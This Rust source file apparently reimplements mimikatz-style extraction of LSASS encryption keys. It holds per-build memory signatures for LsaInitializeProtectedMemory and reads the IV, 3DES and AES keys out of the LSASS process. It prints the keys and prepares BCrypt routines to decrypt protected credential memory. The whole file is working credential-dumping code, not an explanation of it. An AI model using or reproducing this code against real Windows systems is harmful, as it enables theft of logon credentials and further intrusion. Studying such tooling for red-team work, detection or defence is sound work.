use crate::binding::Windows::Win32::Security::{
    BCryptDecrypt, BCryptEncrypt, BCryptGenerateSymmetricKey, BCryptGetProperty,
    BCryptOpenAlgorithmProvider, BCryptOpenAlgorithmProvider_dwFlags, BCryptSetProperty,
    BCRYPT_PAD,
};
use crate::binding::Windows::Win32::SystemServices::PWSTR;
use crate::error::{LsaError, LsaResult};
use crate::lsa::{self, read_process_mem};
use std::{ffi::c_void, mem};

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
mod PTRN {
    use crate::lsa;

    pub(crate) const PTRN_WNO8_LsaInitializeProtectedMemory_KEY: [u8; 13] = [
        0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d,
    ];
    pub(crate) const PTRN_WIN8_LsaInitializeProtectedMemory_KEY: [u8; 12] = [
        0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d,
    ];
    pub(crate) const PTRN_WN10_LsaInitializeProtectedMemory_KEY: [u8; 16] = [
        0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d,
        0x15,
    ];
    pub(crate) const PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef: [(
        u32,
        &[u8],
        (isize, isize, isize),
    ); 5] = [
        // InitializationVector, h3DesKey, hAesKey
        (
            lsa::WIN_BUILD_VISTA,
            &PTRN_WNO8_LsaInitializeProtectedMemory_KEY,
            (63, -69, 25),
        ),
        (
            lsa::WIN_BUILD_7,
            &PTRN_WNO8_LsaInitializeProtectedMemory_KEY,
            (59, -61, 25),
        ),
        (
            lsa::WIN_BUILD_8,
            &PTRN_WIN8_LsaInitializeProtectedMemory_KEY,
            (62, -70, 23),
        ),
        (
            lsa::WIN_BUILD_10_1507,
            &PTRN_WN10_LsaInitializeProtectedMemory_KEY,
            (61, -73, 16),
        ),
        (
            lsa::WIN_BUILD_10_1809,
            &PTRN_WN10_LsaInitializeProtectedMemory_KEY,
            (67, -89, 16),
        ),
    ];
}

#[cfg(all(target_os = "windows", target_arch = "x86"))]
mod PTRN {
    use crate::lsa;

    pub(crate) const PTRN_WALL_LsaInitializeProtectedMemory_KEY: [u8; 5] =
        [0x6a, 0x02, 0x6a, 0x10, 0x68];
    pub(crate) const PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef: [(
        u32,
        &[u8],
        (isize, isize, isize),
    ); 4] = [
        // InitializationVector, h3DesKey, hAesKey
        (
            lsa::WIN_BUILD_VISTA,
            &PTRN_WALL_LsaInitializeProtectedMemory_KEY,
            (5, -76, -21),
        ),
        (
            lsa::WIN_BUILD_8,
            &PTRN_WALL_LsaInitializeProtectedMemory_KEY,
            (5, -69, -18),
        ),
        (
            lsa::WIN_BUILD_BLUE,
            &PTRN_WALL_LsaInitializeProtectedMemory_KEY,
            (5, -79, -22),
        ), // post 11/11
        (
            lsa::WIN_BUILD_10_1507,
            &PTRN_WALL_LsaInitializeProtectedMemory_KEY,
            (5, -79, -22),
        ),
    ];
}

#[repr(C)]
#[derive(Debug)]
struct KIWI_HARD_KEY {
    cbSecret: u32,
    data: [u8; 1], // etc...
}

#[repr(C)]
#[derive(Debug)]
struct KIWI_BCRYPT_KEY {
    size: u32,
    tag: u32, // 'MSSK'
    typ: u32,
    unk0: u32,
    unk1: u32,
    bits: u32,
    hardkey: KIWI_HARD_KEY,
}

#[repr(C)]
#[derive(Debug)]
struct KIWI_BCRYPT_KEY8 {
    size: u32,
    tag: u32, // 'MSSK'
    typ: u32,
    unk0: u32,
    unk1: u32,
    unk2: u32,
    unk3: u32,
    unk4: isize, // before, align in x64
    hardkey: KIWI_HARD_KEY,
}
#[repr(C)]
#[derive(Debug)]
struct KIWI_BCRYPT_KEY81 {
    size: u32,
    tag: u32, // 'MSSK'
    typ: u32,
    unk0: u32,
    unk1: u32,
    unk2: u32,
    unk3: u32,
    unk4: u32,
    unk5: isize, // before, align in x64
    unk6: u32,
    unk7: u32,
    unk8: u32,
    unk9: u32,
    hardkey: KIWI_HARD_KEY,
}

#[repr(C)]
#[derive(Debug)]
struct KIWI_BCRYPT_HANDLE_KEY {
    size: u32,
    tag: u32, // 'UUUR'
    hAlgorithm: isize,
    key: *const KIWI_BCRYPT_KEY,
    unk0: isize,
}

fn get_ptrn_from_build_number(build: u32) -> Option<(u32, &'static [u8], (isize, isize, isize))> {
    let mut ret = None;
    for r in PTRN::PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef.iter() {
        if r.0 <= build {
            ret = Some(*r);
        } else {
            break;
        }
    }
    ret
}

const BCRYPT_ALG_3DES: &str = "3\0D\0E\0S\0\0\0";
const BCRYPT_ALG_AES: &str = "A\0E\0S\0\0\0";
const BCRYPT_CHAINING_MODE: &str = "C\0h\0a\0i\0n\0i\0n\0g\0M\0o\0d\0e\0\0\0";
const BCRYPT_OBJECT_LENGTH: &str = "O\0b\0j\0e\0c\0t\0L\0e\0n\0g\0t\0h\0\0\0";
const BCRYPT_CHAIN_MODE_CBC: &str = "C\0h\0a\0i\0n\0i\0n\0g\0M\0o\0d\0e\0C\0B\0C\0\0\0";
const BCRYPT_CHAIN_MODE_CFB: &str = "C\0h\0a\0i\0n\0i\0n\0g\0M\0o\0d\0e\0C\0F\0B\0\0\0";

#[derive(Debug)]
pub(crate) struct BcryptAlg {
    halg: *mut c_void,
    key: Vec<u8>,
    hkey: *mut c_void,
}

fn get_bcrypt_alg(alg_id: &'static str, mode: &'static str) -> Option<BcryptAlg> {
    let halg = 0 as *mut c_void;
    let key_len = 0_u32;
    let mut key: Vec<u8> = Vec::new();

    unsafe {
        if BCryptOpenAlgorithmProvider(
            &halg as *const *mut c_void as _,
            PWSTR(&alg_id.as_bytes()[0] as *const u8 as _),
            PWSTR::NULL,
            BCryptOpenAlgorithmProvider_dwFlags(0),
        )
        .0 >= 0
        {
            if BCryptSetProperty(
                halg,
                PWSTR(&BCRYPT_CHAINING_MODE.as_bytes()[0] as *const u8 as _),
                &mode.as_bytes()[0] as *const u8 as _,
                mode.len() as _,
                0,
            )
            .0 >= 0
            {
                let needed_size = 0_u32;
                if BCryptGetProperty(
                    halg,
                    PWSTR(&BCRYPT_OBJECT_LENGTH.as_bytes()[0] as *const u8 as _),
                    &key_len as *const u32 as _,
                    mem::size_of::<u32>() as _,
                    &needed_size as *const u32 as _,
                    0,
                )
                .0 >= 0
                {
                    key.resize(key_len as usize, 0);

                    return Some(BcryptAlg {
                        halg: halg,
                        key: key,
                        hkey: 0 as _,
                    });
                }
            }
        }
    }
    None
}

static mut g_alg_3des: BcryptAlg = BcryptAlg {
    halg: 0 as _,
    hkey: 0 as _,
    key: Vec::new(),
};
static mut g_alg_aes: BcryptAlg = BcryptAlg {
    halg: 0 as _,
    hkey: 0 as _,
    key: Vec::new(),
};
static mut g_iv: [u8; 16] = [0; 16];

pub(crate) fn nt6_acquire_keys(lsa: &lsa::Lsa) -> LsaResult<()> {
    let ptrn = get_ptrn_from_build_number(lsa.os_version.build_number)
        .ok_or(LsaError::new("No matched encrypt keys pattern found"))?;
    let ptrn_offset = lsa
        .mod_info
        .mem
        .windows(ptrn.1.len())
        .position(|window| window == ptrn.1)
        .ok_or(LsaError::new(
            "Couldn't find the signature of encrypt keys in memory",
        ))?;

    let iv = [0_u8; 16];

    unsafe {
        let offset64: i32 = 0;

        lsa::read_process_mem(
            lsa.handle,
            (lsa.mod_info.dll_base + ptrn_offset as isize + ptrn.2 .0) as _,
            &offset64 as *const i32 as _,
            mem::size_of::<i32>(),
        )?;

        #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
        lsa::read_process_mem(
            lsa.handle,
            (lsa.mod_info.dll_base
                + ptrn_offset as isize
                + ptrn.2 .0
                + offset64 as isize
                + mem::size_of::<i32>() as isize) as _,
            &iv[0] as *const u8 as _,
            iv.len(),
        )?;

        #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
        println!(
            "Found IV @ 0x{:x}, {}",
            lsa.mod_info.dll_base
                + ptrn_offset as isize
                + ptrn.2 .0
                + offset64 as isize
                + mem::size_of::<i32>() as isize,
            hex::encode(iv),
        );

        #[cfg(all(target_os = "windows", target_arch = "x86"))]
        lsa::read_process_mem(
            lsa.handle,
            offset64 as _,
            &iv[0] as *const u8 as _,
            iv.len(),
        )?;

        #[cfg(all(target_os = "windows", target_arch = "x86"))]
        println!("Found IV @ 0x{:x}, {}", offset64, hex::encode(iv),);
    }

    print!("Found 3DES key @ ");
    let triple_des_key = nt6_acquire_key(lsa, ptrn_offset as isize + ptrn.2 .1)?;
    println!(": {}", hex::encode(&triple_des_key));
    let alg_3des = get_bcrypt_alg(BCRYPT_ALG_3DES, BCRYPT_CHAIN_MODE_CBC)
        .ok_or(LsaError::new("Get BcryptAlg error"))?;
    unsafe {
        if BCryptGenerateSymmetricKey(
            alg_3des.halg,
            &alg_3des.hkey as *const *mut c_void as _,
            &alg_3des.key[0] as *const u8 as _,
            alg_3des.key.len() as _,
            &triple_des_key[0] as *const u8 as _,
            triple_des_key.len() as _,
            0,
        )
        .0 < 0
        {
            return Err(LsaError::new("BCryptGenerateSymmetricKey 3DES key error"));
        }
    }

    print!("Found AES key @ ");
    let aes_key = nt6_acquire_key(lsa, ptrn_offset as isize + ptrn.2 .2)?;
    println!(": {}", hex::encode(&aes_key));
    let alg_aes = get_bcrypt_alg(BCRYPT_ALG_AES, BCRYPT_CHAIN_MODE_CFB)
        .ok_or(LsaError::new("Get BcryptAlg error"))?;
    unsafe {
        if BCryptGenerateSymmetricKey(
            alg_aes.halg,
            &alg_aes.hkey as *const *mut c_void as _,
            &alg_aes.key[0] as *const u8 as _,
            alg_aes.key.len() as _,
            &aes_key[0] as *const u8 as _,
            aes_key.len() as _,
            0,
        )
        .0 < 0
        {
            return Err(LsaError::new("BCryptGenerateSymmetricKey AES key error"));
        }
    }

    unsafe {
        g_alg_3des = alg_3des;
        g_alg_aes = alg_aes;
        g_iv = iv;
    }
    Ok(())
}

pub(crate) fn nt6_acquire_key(lsa: &lsa::Lsa, offset: isize) -> LsaResult<Vec<u8>> {
    let (size, key_offset) = if lsa.os_version.build_number < lsa::WIN_MIN_BUILD_8 {
        (
            mem::size_of::<KIWI_BCRYPT_KEY>(),
            memoffset::offset_of!(KIWI_BCRYPT_KEY, hardkey),
        )
    } else if lsa.os_version.build_number < lsa::WIN_MIN_BUILD_BLUE {
        (
            mem::size_of::<KIWI_BCRYPT_KEY8>(),
            memoffset::offset_of!(KIWI_BCRYPT_KEY8, hardkey),
        )
    } else {
        (
            mem::size_of::<KIWI_BCRYPT_KEY81>(),
            memoffset::offset_of!(KIWI_BCRYPT_KEY81, hardkey),
        )
    };

    unsafe {
        let ptr_handle_key = 0_isize;
        let offset64: i32 = 0;

        lsa::read_process_mem(
            lsa.handle,
            (lsa.mod_info.dll_base + offset) as _,
            &offset64 as *const i32 as _,
            mem::size_of::<i32>(),
        )?;

        #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
        lsa::read_process_mem(
            lsa.handle,
            (lsa.mod_info.dll_base + offset + offset64 as isize + mem::size_of::<i32>() as isize)
                as _,
            &ptr_handle_key as *const isize as _,
            mem::size_of::<isize>(),
        )?;

        #[cfg(all(target_os = "windows", target_arch = "x86"))]
        lsa::read_process_mem(
            lsa.handle,
            offset64 as _,
            &ptr_handle_key as *const isize as _,
            mem::size_of::<isize>(),
        )?;

        let handle_key: KIWI_BCRYPT_HANDLE_KEY = mem::zeroed();
        read_process_mem(
            lsa.handle,
            ptr_handle_key as _,
            &handle_key as *const KIWI_BCRYPT_HANDLE_KEY as _,
            mem::size_of::<KIWI_BCRYPT_HANDLE_KEY>(),
        )?;

        // "UUUR"
        if handle_key.tag == 0x55555552 {
            let bcrypt_key_buf = vec![0_u8; size];
            read_process_mem(
                lsa.handle,
                handle_key.key as _,
                &bcrypt_key_buf[0] as *const u8 as _,
                size,
            )?;

            let bcrypt_key = &*(&bcrypt_key_buf[0] as *const u8 as *const KIWI_BCRYPT_KEY);

            // "MSSK"
            if bcrypt_key.tag == 0x4d53534b {
                let hard_key = &*((&bcrypt_key_buf[0] as *const u8).offset(key_offset as _)
                    as *const KIWI_HARD_KEY);

                let secret = vec![0_u8; hard_key.cbSecret as _];
                read_process_mem(
                    lsa.handle,
                    (handle_key.key as usize
                        + key_offset
                        + memoffset::offset_of!(KIWI_HARD_KEY, data)) as _,
                    &secret[0] as *const u8 as _,
                    secret.len(),
                )?;
                print!(
                    "0x{:x}",
                    handle_key.key as usize
                        + key_offset
                        + memoffset::offset_of!(KIWI_HARD_KEY, data)
                );

                return Ok(secret);
            }
        }

        Err(LsaError::new("Acquire key failed"))
    }
}

pub(crate) fn nt6_encrypt_mem(buf: &[u8], encrypt: bool) -> LsaResult<()> {
    let crypt_fn = if encrypt {
        BCryptEncrypt
    } else {
        BCryptDecrypt
    };

    let local_iv = unsafe { g_iv.clone() };
    unsafe {
        let (hkey, iv_size) = if buf.len() % 8 != 0 {
            (g_alg_aes.hkey, g_iv.len())
        } else {
            (g_alg_3des.hkey, g_iv.len() / 2)
        };

        let result = 0_u32;

        if crypt_fn(
            hkey,
            &buf[0] as *const u8 as _,
            buf.len() as _,
            0 as _,
            &local_iv[0] as *const u8 as _,
            iv_size as _,
            &buf[0] as *const u8 as _,
            buf.len() as _,
            &result as *const u32 as _,
            BCRYPT_PAD(0),
        )
        .0 < 0
        {
            return Err(LsaError::new("Encrypt memory failed"));
        }
    }
    Ok(())
}
